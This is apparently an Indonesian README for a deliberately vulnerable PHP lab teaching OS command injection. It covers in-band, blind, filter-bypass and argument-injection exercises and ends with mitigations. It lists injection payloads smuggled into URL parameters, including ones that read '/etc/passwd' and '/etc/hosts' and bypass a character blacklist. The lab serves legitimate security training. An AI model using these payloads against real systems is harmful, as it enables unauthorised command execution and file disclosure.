# OS Command Injection Lab

Aplikasi PHP sederhana yang sengaja rentan terhadap OS Command Injection, mengikuti kategori
PortSwigger Web Security Academy: **in-band (visible output)**, **blind**, **filter/blacklist
bypass**, dan **argument injection**.

| Lab | Kategori | File | Parameter |
|---|---|---|---|
| 1 | In-band command injection | `lab1_visible.php` | `host` (GET) |
| 2 | Blind command injection (time-based) | `lab2_blind.php` | `domain` (GET) |
| 3 | Command injection + filter bypass | `lab3_filter_bypass.php` | `host` (GET) |
| 4 | Argument injection | `lab4_argument_injection.php` | `url` (GET) |

> ⚠️ **PERINGATAN**: Aplikasi ini sengaja rentan dan benar-benar mengeksekusi perintah shell
> (`ping`, `curl`, `echo`) di dalam container. Jangan deploy ke server publik / internet.
> Jalankan hanya di jaringan lab/lokal yang terisolasi. Container dijalankan dengan kapabilitas
> Docker default (tidak ada `--privileged`), jadi dampaknya terbatas pada isi container itu
> sendiri — cocok untuk demo tanpa risiko ke host.

## Menjalankan

> Lab ini adalah bagian dari satu stack terpadu. Jalankan dari **root repo** (bukan dari
> folder ini), lihat [README.md utama](../README.md) untuk portal navigasinya.

```bash
cd ..            # ke root repo
docker compose up -d --build
```

Buka langsung `http://localhost:8079/cmdi/`, atau lewat Portal di `http://localhost:8079/` →
kategori **A05: Injection** → **OS Command Injection**.

> Semua akses lewat `gateway` (login Basic Auth, satu port untuk semua lab) — lihat
> [README.md utama](../README.md) bagian "Menjalankan (lokal)" untuk cara generate
> kredensialnya. Login cukup sekali, berlaku juga untuk lab SQLi/XSS.

## Panduan tiap lab

### Lab 1 — Command Injection (visible output)
Query dasar: `ping -c 2 <host>`, hasilnya ditampilkan langsung.
```
?host=127.0.0.1; id
?host=127.0.0.1 && whoami
?host=127.0.0.1 | cat /etc/passwd
?host=$(whoami)
```

### Lab 2 — Blind Command Injection (time-based)
Tidak ada output/error yang ditampilkan, respons selalu generik. Gunakan `sleep` sebagai
sinyal waktu:
```
?domain=example.com; sleep 5
?domain=example.com && sleep 5
?domain=$(sleep 5)
```
Bandingkan waktu respons normal (~instan) vs saat payload `sleep 5` berhasil dieksekusi.

### Lab 3 — Filter Bypass
Karakter `;`, `|`, `&` diblokir (dihapus dari input), tapi newline, backtick, dan `$()` tidak
disaring:
```
?host=127.0.0.1%0aid
?host=127.0.0.1 `id`
?host=127.0.0.1 $(id)
```
Kirim payload dengan `%0a` langsung di address bar browser, atau gunakan Burp Repeater untuk
mengirim byte newline mentah dengan lebih presisi.

### Lab 4 — Argument Injection
Input dibungkus `escapeshellarg()` (jadi metakarakter shell tidak berguna di sini), tapi
aplikasi lupa menambahkan `--` sebelum URL, sehingga input yang diawali `-` tetap ditafsirkan
`curl` sebagai flag:
```
?url=-h
?url=-V
?url=-K/etc/hosts
```
Ini adalah kelas kerentanan yang berbeda dari command injection klasik — tidak ada shell
metacharacter yang terlibat sama sekali, murni penyalahgunaan parsing argumen program.

## Mitigasi (untuk didiskusikan setelah lab)
- **Hindari memanggil shell sama sekali** bila memungkinkan: gunakan library native (mis.
  ekstensi PHP `sockets`/`curl` alih-alih `shell_exec("curl ...")`, atau `dns_get_record()`
  alih-alih memanggil `nslookup`).
- Jika harus memanggil proses eksternal, gunakan API yang memisahkan argumen secara eksplisit
  (mis. `proc_open()` dengan array argumen atau `Symfony\\Component\\Process\\Process` di PHP,
  atau `subprocess.run([...], shell=False)` di Python) — ini menghilangkan seluruh kelas
  masalah metakarakter shell (Lab 1–3).
- **Allowlist ketat** untuk input yang memang harus diteruskan ke command (mis. hanya
  karakter alfanumerik, titik, dan dash untuk hostname), bukan blacklist (Lab 3).
- Untuk argument injection (Lab 4): selalu sisipkan pemisah `--` sebelum argumen yang berasal
  dari input pengguna, dan/atau validasi bahwa nilainya tidak diawali karakter `-`.
- Jalankan proses eksternal dengan **least privilege** dan di dalam sandbox/container terpisah
  agar dampak eksploitasi tetap terbatas.
